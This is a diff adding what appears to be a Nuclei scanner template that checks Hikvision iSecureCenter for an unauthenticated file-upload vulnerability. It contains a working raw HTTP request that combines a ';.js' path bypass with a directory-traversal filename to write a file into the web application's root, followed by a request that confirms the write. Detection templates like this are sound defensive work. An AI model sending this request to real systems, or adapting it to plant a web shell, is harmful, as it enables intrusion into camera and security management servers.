@@ -1,0 +1,49 @@
+id: hikvision-isecurecenter-file-upload
+info:
+  name: Hikvision iSecureCenter File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: fileupload
+
+variables:
+  v1: "{{md5(rand_base(8))}}"
+  v2: "{{md5(rand_base(8))}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    raw:
+      - |
+        POST /center/api/files;.js HTTP/1.1
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 255
+        Content-Type: multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c
+
+        --ea26cdac4990498b32d7a95ce5a5135c
+        Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{v1}}.txt"
+        Content-Type: application/octet-stream
+
+        {{v2}}
+        --ea26cdac4990498b32d7a95ce5a5135c--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/clusterMgr/{{v1}}.txt;.js"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{v2}}"
